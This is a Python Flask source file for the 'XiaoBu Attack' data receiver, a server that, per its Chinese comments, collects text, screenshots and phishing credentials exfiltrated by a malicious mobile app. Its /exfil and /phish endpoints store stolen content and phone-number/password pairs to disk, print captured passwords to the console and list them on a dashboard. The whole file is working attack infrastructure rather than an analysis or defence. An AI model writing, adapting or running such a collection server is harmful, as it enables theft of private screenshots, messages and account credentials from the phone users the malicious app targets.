#!/usr/bin/env python3
"""
XiaoBu Attack - 数据接收服务器
接收恶意App外泄的文本、截图和钓鱼凭证
运行: python3 receiver.py (默认端口8080)
"""

from flask import Flask, request, jsonify, render_template_string
import json
import os
import base64
from datetime import datetime

app = Flask(__name__)

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
os.makedirs(DATA_DIR, exist_ok=True)

INDEX_HTML = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XiaoBu Attack - 数据面板</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
        h1 { color: #58a6ff; margin-bottom: 10px; }
        .stats { display: flex; gap: 20px; margin: 20px 0; }
        .stat { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px 24px; }
        .stat .num { font-size: 32px; font-weight: bold; color: #58a6ff; }
        .stat .label { font-size: 12px; color: #8b949e; }
        .entry { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; margin: 12px 0; }
        .entry .time { color: #58a6ff; font-size: 12px; }
        .entry .type { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin: 4px 0; }
        .type-text { background: #238636; }
        .type-screenshot { background: #1f6feb; }
        .type-phish { background: #da3633; }
        pre { background: #0d1117; padding: 12px; border-radius: 4px; overflow-x: auto; font-size: 11px; margin: 8px 0; }
        .empty { text-align: center; padding: 60px; color: #484f58; }
        a { color: #58a6ff; }
    </style>
</head>
<body>
    <h1>🔬 XiaoBu Attack - 数据面板</h1>
    <div class="stats">
        <div class="stat"><div class="num">{{ stats.text }}</div><div class="label">文本外泄</div></div>
        <div class="stat"><div class="num">{{ stats.screenshot }}</div><div class="label">截图外泄</div></div>
        <div class="stat"><div class="num">{{ stats.phish }}</div><div class="label">钓鱼凭证</div></div>
    </div>
    <p>服务端运行中 | 上次更新: {{ now }}</p>
    <hr style="border-color:#30363d; margin: 16px 0;">
    {% if entries %}
        {% for e in entries %}
        <div class="entry">
            <div class="time">{{ e.timestamp }}</div>
            <span class="type type-{{ e.type }}">{{ e.type }}</span>
            <div>设备: {{ e.device_id }}</div>
            {% if e.preview %}<pre>{{ e.preview }}</pre>{% endif %}
        </div>
        {% endfor %}
    {% else %}
        <div class="empty">暂无数据 | 等待攻击触发...</div>
    {% endif %}
</body>
</html>"""


def save_data(data_type, body):
    """保存数据到文件"""
    device_id = body.get("device_id", "unknown")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"{data_type}_{ts}.json"
    filepath = os.path.join(DATA_DIR, filename)
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(body, f, ensure_ascii=False, indent=2)
    print(f"[+] {data_type} saved: {filename}")
    return filepath


@app.route("/", methods=["GET"])
def index():
    """数据面板首页"""
    entries = []
    stats = {"text": 0, "screenshot": 0, "phish": 0}
    try:
        files = sorted(os.listdir(DATA_DIR), reverse=True)
        for f in files[:50]:
            if not f.endswith(".json"):
                continue
            filepath = os.path.join(DATA_DIR, f)
            try:
                with open(filepath, "r", encoding="utf-8") as fp:
                    data = json.load(fp)
            except Exception:
                continue
            entry_type = data.get("payload_type", "unknown")
            if "phone" in data:
                entry_type = "phish"
            elif "screenshot_base64" in data and data.get("screenshot_base64"):
                entry_type = "screenshot"
            else:
                entry_type = "text"
            stats[entry_type] = stats.get(entry_type, 0) + 1
            preview = ""
            if entry_type == "text":
                preview = data.get("content", "")[:500]
            elif entry_type == "phish":
                preview = f"手机号: {data.get('phone', '?')}\n密码: {data.get('password', '?')}"
                if "deeplink_uri" in data:
                    preview += f"\nDeepLink: {data['deeplink_uri'][:200]}"
            elif entry_type == "screenshot":
                preview = f"截图: {data.get('filename', '?')} ({len(data.get('screenshot_base64', ''))} bytes base64)"
            entries.append({
                "timestamp": data.get("timestamp", f),
                "device_id": data.get("device_id", "?"),
                "type": entry_type,
                "preview": preview,
            })
    except Exception as e:
        print(f"[!] Error listing data: {e}")
    return render_template_string(
        INDEX_HTML,
        stats=stats,
        entries=entries,
        now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    )


@app.route("/exfil", methods=["POST"])
def exfil():
    """接收文本/截图外泄数据"""
    try:
        body = request.get_json(force=True)
    except Exception:
        body = {}
    if not body:
        return jsonify({"status": "error", "reason": "empty body"}), 400
    # 处理截图base64
    payload_type = body.get("payload_type", "text")
    if body.get("screenshot_base64"):
        payload_type = "screenshot"
        try:
            img_data = base64.b64decode(body["screenshot_base64"])
            ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            img_path = os.path.join(DATA_DIR, f"screenshot_{ts}.png")
            with open(img_path, "wb") as f:
                f.write(img_data)
            body["screenshot_saved"] = img_path
            print(f"[+] Screenshot saved: {img_path} ({len(img_data)} bytes)")
        except Exception as e:
            print(f"[!] Screenshot decode error: {e}")
    body["payload_type"] = payload_type
    save_data(payload_type, body)
    return jsonify({"status": "ok", "type": payload_type}), 200


@app.route("/phish", methods=["POST"])
def phish():
    """接收钓鱼凭证"""
    try:
        body = request.get_json(force=True)
    except Exception:
        body = {}
    if not body:
        return jsonify({"status": "error", "reason": "empty body"}), 400
    body["payload_type"] = "phish"
    phone = body.get("phone", "?")
    password = body.get("password", "?")
    print(f"[!!!] PHISH: phone={phone} password={password}")
    save_data("phish", body)
    return jsonify({"status": "ok", "type": "phish"}), 200


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "server": "XiaoBu Attack Receiver v2.0"})


if __name__ == "__main__":
    print("=" * 50)
    print("  XiaoBu Attack - 数据接收服务器 v2.0")
    print(f"  数据目录: {DATA_DIR}")
    print("  端点:")
    print("    GET  /       - 数据面板")
    print("    POST /exfil  - 接收外泄数据")
    print("    POST /phish  - 接收钓鱼凭证")
    print("    GET  /health - 健康检查")
    print("=" * 50)
    app.run(host="0.0.0.0", port=8080, debug=False)
